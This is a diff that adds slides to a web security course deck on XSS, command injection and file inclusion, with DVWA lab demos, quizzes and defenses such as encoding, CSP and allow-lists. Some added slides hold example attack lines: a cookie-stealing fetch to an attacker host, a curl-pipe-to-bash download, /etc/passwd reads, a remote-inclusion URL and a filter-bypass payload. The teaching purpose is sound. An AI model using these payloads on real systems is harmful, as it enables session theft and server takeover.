@@ -149,6 +149,57 @@ These attacks, against a **real** site, can:
 
 ---
 
+# Analogy: a form letter with a blank
+
+- An app builds output like a **form letter** with a blank to fill in.
+- Normally the blank holds harmless data: a name, an IP, a page name.
+- But if the app never checks the blank, you can write **instructions** there.
+
+> The bug isn't the blank — it's **trusting whatever** gets written in it.
+
+---
+
+# Why this matters
+
+- These three bugs are still in the **OWASP Top 10** every year.
+- They power real breaches: stolen accounts, wiped servers, leaked files.
+- The fix is cheap **if you build it in** — and expensive after a breach.
+- Learn the attack once, and you can spot the same pattern everywhere.
+
+> One pattern, three faces. Recognize the pattern and you can defend all three.
+
+---
+
+# The cure, in three words
+
+| Word | What it means |
+|------|---------------|
+| **Validate** | Check input is the expected type/length/format; reject the rest. |
+| **Encode** | Convert characters so they show as text, never run as code. |
+| **Isolate** | Treat input as data — keep it away from shells, paths, and queries. |
+
+> Every defense this week is one of these three. Server-side, in layers.
+
+---
+
+# Check your understanding
+
+> A page takes a `city` parameter and puts it straight into the HTML, an OS command, **and** a file path.
+>
+> **Which bug class matches each destination?**
+
+---
+
+# Answer
+
+- Into the **HTML** → **XSS** (browser runs it as code).
+- Into an **OS command** → **command injection** (shell runs it).
+- Into a **file path** → **file inclusion** (server loads the wrong file).
+
+> Same untrusted input, three destinations, three bug names.
+
+---
+
 # What is XSS?
 
 **Cross-Site Scripting** lets an attacker's **JavaScript run in someone else's browser.**
@@ -159,6 +210,30 @@ Why it's dangerous:
 - **Keylog** what the victim types
 
 > The browser can't tell *your* `<script>` from the site's own — unless the app stops it.
+
+---
+
+# Why the browser gets fooled
+
+- A browser reads HTML top to bottom and **runs any `<script>` it finds**.
+- It trusts that scripts came from the **site**, not from a visitor.
+- If your input is dropped into the page unchanged, your script looks **native**.
+
+> The browser has no way to ask "did the site mean to send this?" — so the app must.
+
+---
+
+# Where XSS lands: the page
+
+```html
+<p>Results for: YOUR_INPUT_HERE</p>
+```
+
+- The app pastes your input where `YOUR_INPUT_HERE` is.
+- Type `cats` → harmless: `Results for: cats`.
+- Type `<script>...</script>` → the browser **runs it**.
+
+> The danger is the exact spot your text lands in the page.
 
 ---
 
@@ -173,6 +248,34 @@ Why it's dangerous:
 > **Stored is the most dangerous** — it hits people who never clicked anything.
 
 <!-- Use this table every day. The three-type confusion is the most common XSS misconception. -->
+
+---
+
+# Reflected vs stored: the mail analogy
+
+- **Reflected** = a prank note you mail to **one** person who opens it.
+- **Stored** = graffiti you spray on a **wall** everyone walks past.
+- The wall hits people who never asked to see it — and keeps hitting them.
+
+> Reflected needs a victim to click your link. Stored just waits for traffic.
+
+---
+
+# Check your understanding
+
+> A site saves your profile "bio" and shows it to anyone who visits your page. You put a `<script>` in the bio.
+>
+> **Which type of XSS is this, and who gets hit?**
+
+---
+
+# Answer
+
+- **Stored XSS** — the bio is **saved** and served to others later.
+- It hits **every visitor** to your profile, not just you.
+- That's the worst kind: victims never clicked a special link.
+
+> Saved + served to others = stored. The blast radius is everyone.
 
 ---
 
@@ -204,20 +307,51 @@ Browse DVWA with Dev Tools/Burp open. **Record** two input fields and predict wh
 
 ---
 
-# Reflected XSS — the payload (lab-only)
+# Reflected XSS — the request (lab-only)
 
-On DVWA's **XSS (Reflected)** page, the app echoes your name straight back. A harmless proof payload:
+On DVWA's **XSS (Reflected)** page, the name you type goes in the URL:
 
-```html
-<script>alert(1)</script>
+```http
+GET /vulnerabilities/xss_r/?name=<script>alert(1)</script>
+Host: 10.10.10.5
 ```
 
-- If an **alert box** pops, **your JavaScript ran** — that's XSS.
-- "Reflected" = it bounced back in **this** response; affects whoever opens the crafted input.
+- The `name` parameter carries the payload to the server.
+- The server will paste `name` straight back into the page.
 
 > Lab demonstration only, against DVWA. Never a real site.
 
+---
+
+# Reflected XSS — the response (lab-only)
+
+The server echoes your input into the HTML it sends back:
+
+```html
+<p>Hello <script>alert(1)</script></p>
+```
+
+- The browser sees a real `<script>` tag and **runs it**.
+- An **alert box** pops → proof your JavaScript executed.
+
+> "Reflected" = it bounced back in **this** response, then ran.
+
 <!-- DVWA low security. The alert is just proof the script executed — emphasize it could have been cookie theft. -->
+
+---
+
+# Why an alert box is scary
+
+The `alert(1)` is harmless — but it **proves code runs**. Swap it for:
+
+```html
+<script>fetch('http://attacker/c?'+document.cookie)</script>
+```
+
+- That line would ship the victim's **session cookie** to an attacker.
+- Whoever holds the cookie can **log in as the victim**.
+
+> If `alert(1)` runs, so would cookie theft. The proof *is* the danger.
 
 ---
 
@@ -233,6 +367,24 @@ On DVWA's **XSS (Stored)** guestbook, submit:
 - Now it runs for **every future visitor**, not just you.
 
 > This is why stored XSS is more dangerous: it hits people who never consented.
+
+---
+
+# Check your understanding
+
+> Reflected XSS needs the victim to **open a crafted link**. Stored XSS is saved on the page.
+>
+> **Which one can hit a visitor who never clicked anything special?**
+
+---
+
+# Answer
+
+- **Stored XSS.** It's already saved on a normal page everyone visits.
+- Reflected XSS needs the victim to open the attacker's **specific link**.
+- That's why stored is rated more dangerous — it scales to all visitors.
+
+> No click required = stored = wider, automatic reach.
 
 ---
 
@@ -255,6 +407,23 @@ Turn dangerous characters into harmless text so the browser **displays** them in
 
 ---
 
+# Encoding in action
+
+Same payload, before and after the server encodes it:
+
+```
+Attacker sends:  <script>alert(1)</script>
+Page renders:    &lt;script&gt;alert(1)&lt;/script&gt;
+User sees:       <script>alert(1)</script>   (as plain text)
+```
+
+- The visitor **reads** the tag as text on the page.
+- The browser never builds a real `<script>` element, so nothing runs.
+
+> Encode where input is **output** — that's the moment that matters.
+
+---
+
 # DEFENSE: Content Security Policy (CSP)
 
 A **response header** that tells the browser which scripts are allowed to run:
@@ -268,6 +437,24 @@ Content-Security-Policy: default-src 'self'; script-src 'self'
 - A **second layer** — defense-in-depth — not a replacement for encoding.
 
 > Encode on output **and** add a CSP. Validate/sanitize on save for stored XSS.
+
+---
+
+# Check your understanding
+
+> A developer adds a strict **CSP** but forgets to **encode** output. A payload still gets reflected into the page.
+>
+> **Does the script run? Why have both?**
+
+---
+
+# Answer
+
+- The CSP can **still block** the inline script from running — a backstop.
+- But relying on one layer is risky: a CSP typo or exception reopens the hole.
+- **Encoding** stops the tag from forming; **CSP** stops scripts that slip through.
+
+> Defense-in-depth: two layers mean one mistake isn't game over.
 
 ---
 
@@ -313,6 +500,21 @@ Type a normal value first to prove input reaches an OS command:
 
 ---
 
+# Shell chaining characters
+
+The shell treats some characters as **"and also run this"**:
+
+| Character | Meaning |
+|-----------|---------|
+| `;` | Run the next command after this one (Linux). |
+| `&&` | Run the next command if the first succeeds. |
+| `|` | Pipe output into the next command. |
+| `&` | Run commands together (common on Windows). |
+
+> These separators are why a single input box can run **two** commands.
+
+---
+
 # The injection (lab-only)
 
 Append an extra command with a chaining character:
@@ -333,6 +535,40 @@ ping -c 4 127.0.0.1; whoami
 > Input reached the **shell** — now the attacker runs anything. (Windows image uses `&`.)
 
 <!-- Show the real OS output so the danger is concrete. DVWA low security only. -->
+
+---
+
+# Why this is so dangerous
+
+Once you can run **one** command, you can usually run **many**:
+
+- `whoami` → learn who the server runs as
+- `cat /etc/passwd` → read sensitive files
+- `curl attacker.com/x | bash` → download and run attacker code
+
+> Command injection often means **full control** of the server. Top severity.
+
+---
+
+# Check your understanding
+
+```
+Behind the scenes:  ping -c 4 <input>
+```
+
+> A user enters `8.8.8.8; cat /etc/passwd`.
+>
+> **What two things does the server run, and why?**
+
+---
+
+# Answer
+
+- It runs `ping -c 4 8.8.8.8` **and then** `cat /etc/passwd`.
+- The `;` ends the ping and **starts a second command**.
+- The app glued raw input into a shell, so the shell obeyed both.
+
+> The semicolon turned one box into two commands. That's the bug.
 
 ---
 
@@ -404,6 +640,35 @@ Two flavors:
 
 ---
 
+# Walking the path up
+
+Start in the web folder and climb with each `../`:
+
+```
+/var/www/html/pages/   ← start here
+../        → /var/www/html/
+../../     → /var/www/
+../../../  → /var/
+../../../../etc/passwd  → /etc/passwd
+```
+
+- Extra `../` past the root just stay at `/` — safe to over-climb.
+- That's why attackers stack several: it works at many depths.
+
+> Each `../` is one step toward the top of the disk.
+
+---
+
+# Why /etc/passwd matters
+
+- It's a file that exists on **every** Linux system, readable by all.
+- Reading it **proves** the traversal works — a reliable test target.
+- The real prize is config files with **passwords**, keys, or source code.
+
+> `/etc/passwd` is the "hello world" of LFI: easy proof the door is open.
+
+---
+
 # LFI demo (lab-only)
 
 On DVWA's **File Inclusion** page, change the parameter:
@@ -431,6 +696,24 @@ On DVWA's **File Inclusion** page, change the parameter:
 | Severity | High | **Critical** |
 
 > RFI is worse because it can execute **attacker-supplied code** — that's what `allow_url_include=Off` prevents.
+
+---
+
+# Check your understanding
+
+> An app loads `?page=http://evil.com/shell.txt` and the attacker's code **runs** on the server.
+>
+> **Is this LFI or RFI, and why is it worse?**
+
+---
+
+# Answer
+
+- **RFI** — the file came from a **remote** attacker URL, not the server.
+- It's worse because the attacker controls the file's **contents** — their code.
+- LFI usually only **reads** files; RFI can **run** them → full compromise.
+
+> Remote source + attacker-chosen code = critical. That's RFI.
 
 ---
 
@@ -492,6 +775,36 @@ On DVWA's **File Inclusion** page, change the parameter:
 
 ---
 
+# Allow-list vs blocklist
+
+| | Blocklist | Allow-list |
+|--|-----------|------------|
+| Idea | List what's **banned** | List what's **allowed** |
+| Problem | You must predict every bad input | Unknown input is rejected by default |
+| Example | "strip `<script>`" | "only letters and digits" |
+
+> Allow-listing is safer: you can't forget to ban something you never imagined.
+
+---
+
+# Check your understanding
+
+> A filter blocks the word `script`. An attacker sends `<scr<script>ipt>`.
+>
+> **Why might the payload still survive?**
+
+---
+
+# Answer
+
+- The filter removes the inner `script`, leaving `<script>` behind.
+- One-pass blocklists can be **defeated by nesting** or odd spellings.
+- An **allow-list** ("only safe characters") wouldn't have this gap.
+
+> Blocklists play whack-a-mole. Allow-lists close the whole field.
+
+---
+
 # Client-side attacks (awareness)
 
 | | Server-side (this unit) | Client-side |
@@ -544,6 +857,34 @@ On DVWA's **File Inclusion** page, change the parameter:
 - **Command injection** runs attacker commands via the shell.
 - **LFI/RFI** loads files the app should never share.
 - The cure is always **validate, encode, isolate** — enforced **server-side**, in layers.
+
+---
+
+# One pattern, three faces
+
+| Bug | Input lands in… | Cure |
+|-----|-----------------|------|
+| XSS | the page (HTML) | encode output + CSP |
+| Command injection | an OS command | safe API + allow-list |
+| File inclusion | a file path | allow-list + no remote |
+
+> Different destination, same villain, same family of cure.
+
+---
+
+# Check your understanding
+
+> In one phrase each, what do **validate**, **encode**, and **isolate** mean?
+
+---
+
+# Answer
+
+- **Validate** — reject input that isn't the expected type/length/format.
+- **Encode** — turn characters into harmless text so they aren't run as code.
+- **Isolate** — keep input as data, away from shells, paths, and queries.
+
+> Three words, every defense this week. Server-side, in layers.
 
 ---
 
